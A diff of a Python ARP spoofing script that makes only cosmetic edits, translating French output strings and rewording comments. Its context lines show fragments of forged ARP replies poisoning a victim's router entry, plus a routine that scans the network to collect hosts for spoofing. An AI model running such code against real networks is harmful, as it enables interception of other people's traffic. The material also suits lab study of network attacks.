@@ -9,7 +9,7 @@ import time
 import argparse
 
 
-# Clean the network
+# Restore the network
 def signal_handler(sig, frame):
   global victim_ip
   global routeur_ip
@@ -39,7 +39,7 @@ def arp_spoof1():
   arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
   packet = ethernet / arp
   sendp(packet, iface=iface)
-  print("[*]Sent")
+  print("[*] Spoof Sent")
 
 
 def arp_sniffing1(pkt):
@@ -69,7 +69,7 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       # For each response, we add ip and mac to the 'victimes' list
       victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
   # Print all network victims
-  print("\nEQUIPEMENTS CONNECTÉS AU RÉSEAU")
+  print("\nCONNECTED DEVICES ON THE NETWORK")
   print("IP" + " "*18+"MAC")
   for x in victimes:
       print("{:16}    {}".format(x['ip'], x['mac']))
@@ -151,6 +151,5 @@ try:
 
 except:
   print("[!] Closing program...")
-              
-      
+                 
 # Stop program with CTRL+C
